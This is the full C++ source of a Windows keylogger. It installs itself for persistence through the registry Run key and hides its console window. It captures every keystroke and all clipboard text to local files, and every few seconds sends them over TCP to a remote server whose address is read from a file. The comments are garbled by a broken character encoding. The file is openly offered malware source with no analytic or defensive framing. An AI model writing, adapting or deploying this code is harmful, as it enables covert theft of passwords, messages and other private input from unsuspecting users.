#include <ws2tcpip.h>
#include <winsock2.h>
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include<thread>
#include <atomic>
#include <filesystem>
#include <direct.h>  
#pragma comment(lib, "ws2_32.lib")

const int PORT = 12345;
char *IP_ADDRESS;

using namespace std;

string preClip;
int preKey = -1;
atomic_int index(0);



void startOK() {
	char system[MAX_PATH]; //ϵͳĿ¼·��
	char pathtofile[MAX_PATH]; //Ҫ�������е��ļ�������·��
	char currentpath[MAX_PATH];
	HMODULE GetModH = GetModuleHandle(NULL);
	GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
	GetSystemDirectory(system, sizeof(system));
	GetCurrentDirectory(MAX_PATH, currentpath);
	strcat_s(system, "\\Release");
	CreateDirectory(system, NULL);
	try {
		std::filesystem::copy(currentpath, system, std::filesystem::copy_options::recursive);
	}
	catch (const std::exception&) {
		return;
	}
	
	strcat_s(system, "\\KeyLogger.exe");
	HKEY hKey;
	RegOpenKeyEx(HKEY_CURRENT_USER,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "C:\\Users\\18506\\source\\repos\\KeyLogger\\x64\\Release\\KeyLogger.exe", 0, REG_SZ, (const unsigned char*)system, sizeof(system));
	RegCloseKey(hKey);

}

void LOG(string input) {
	fstream LogFile;
	
	LogFile.open("dat"+to_string(index)+".txt", fstream::app);
	
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
	
}
string GetTextFromClipboard() {
	string temp;
	if (OpenClipboard(NULL)) {
		HGLOBAL hg = GetClipboardData(CF_TEXT);
		if (hg != NULL) {
			char* txt = (char*)GlobalLock(hg);
			if (txt != NULL) {
				temp = txt;
				GlobalUnlock(hg);
			}
		}
		CloseClipboard();
	}

	return temp;
}



void ListenOnKey() {
	while (true) {
		string clip = GetTextFromClipboard();
		if (!clip.empty() && preClip.compare(clip) != 0) {
			cout << clip << endl;
			preClip = clip;
			LOG("Clipboard:" + clip + "\n");
		}

		for (int i = 0; i <= 0xFE; i++) {
			if (GetAsyncKeyState(i) == -32767) {

				/*	
				string s1 = "Key.";
				string s2;
				s2.append(1, i);
				s1 = s1 + s2 + "\n";
				LOG(s1);
				*/


				LOG("Key." + to_string(i) + "\n");
				cout << "Key." << i << "\n";
				if (i == 16) {
					preKey = i;
				}
			}

			if (preKey == 16 && GetAsyncKeyState(preKey) == 0) {
				LOG(" SHIFT_REALSED \n");
				preKey = -1;
			}

		}

	}


}

int sendServer() {
	

	while (true) {
		Sleep(5000);
		// ��ʼ��Winsock
		
		WSADATA wsaData;
		if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
			std::cerr << "WSAStartupʧ�ܣ������룺" << WSAGetLastError() << std::endl;
			continue;
		}

		// �����׽���
		SOCKET socket_desc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (socket_desc == INVALID_SOCKET) {
			std::cerr << "�޷������׽��֣������룺" << WSAGetLastError() << std::endl;
			WSACleanup();
			continue;
		}


		// ��ʼ����������ַ�ṹ��
		sockaddr_in server_addr;
		server_addr.sin_family = AF_INET;
		server_addr.sin_port = htons(PORT);
		inet_pton(AF_INET, IP_ADDRESS, &server_addr.sin_addr.S_un.S_addr);


		// ��ȡ�ļ�
		std::ifstream file("dat" + to_string(index) + ".txt", std::ios::binary);
		if (!file) {
			std::cerr << "�޷����ļ�" << std::endl;
			closesocket(socket_desc);
			WSACleanup();
			continue;
		}

		
		// ���ӵ�������
		if (connect(socket_desc, (SOCKADDR*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
			std::cerr << "����ʧ�ܣ������룺" << WSAGetLastError() << std::endl;
			closesocket(socket_desc);
			WSACleanup();
			continue;
			
		}

		

		// �����ļ�
		

		char buffer[1024];
		while (!file.eof()) {
			file.read(buffer, sizeof(buffer));
			int bytes_read = static_cast<int>(file.gcount());
			if (send(socket_desc, buffer, bytes_read, 0) == SOCKET_ERROR) {
				std::cerr << "����ʧ�ܣ������룺" << WSAGetLastError() << std::endl;
				closesocket(socket_desc);
				WSACleanup();
				
				continue;
			}
		}

		// �ر��׽���
		closesocket(socket_desc);
		WSACleanup();
		index++;
		
	}
	return 0;

}



int setup() {
	ifstream fin;
	fin.open("IP.txt", ios::in);
	if (!fin.is_open())
	{
		cout << "ERROR!!!" << endl;
		return 1;
	}
	char buff[1024];
	while (fin >> buff)
	{
		cout << buff<<endl;
		IP_ADDRESS = buff;
		break;
	}
	cout << "sss:::"<<IP_ADDRESS << endl;
	return 0;
	
}

int main() {
	startOK();
	if (setup()) {
		return 1;
	}
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	thread Listen(ListenOnKey);
	thread sender(sendServer);
	Listen.join();
	sender.join();
	return 0;
}


